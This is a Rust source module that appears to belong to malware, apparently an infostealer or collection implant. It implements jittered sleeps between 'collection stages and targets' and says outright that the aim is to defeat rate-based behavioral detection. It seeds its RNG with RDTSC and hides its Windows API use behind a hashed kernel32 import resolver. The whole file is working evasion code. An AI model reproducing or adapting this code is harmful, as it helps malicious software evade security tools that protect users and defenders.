//! Randomized pacing between collection stages and targets.
//! Breaks rate-based behavioral heuristics; no rand crate, no global Mutex.

use std::time::Duration;

struct XorShift(u64);

impl XorShift {
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
}

fn seed() -> u64 {
    unsafe {
        let tsc_lo: u32;
        let tsc_hi: u32;
        core::arch::asm!("rdtsc", out("eax") tsc_lo, out("edx") tsc_hi);
        let tsc = ((tsc_hi as u64) << 32) | tsc_lo as u64;
        // GetTickCount64 via hashed resolve; fall back to TSC alone.
        let f = crate::resolve::resolve("kernel32.dll", crate::api!("GetTickCount64"));
        let tick = if f != 0 {
            let f: unsafe extern "system" fn() -> u64 = std::mem::transmute(f);
            f()
        } else {
            0
        };
        let s = tsc ^ tick.rotate_left(17) ^ 0x9e3779b97f4a7c15;
        if s == 0 { 0x2545f4914f6cdd1d } else { s }
    }
}

/// Sleep a random duration in [min_ms, max_ms]. No-op if max_ms is 0.
pub fn sleep_jitter(min_ms: u64, max_ms: u64) {
    if max_ms == 0 {
        return;
    }
    let mut rng = XorShift(seed());
    let span = max_ms.saturating_sub(min_ms);
    let ms = min_ms + (rng.next() % (span + 1));
    std::thread::sleep(Duration::from_millis(ms));
}
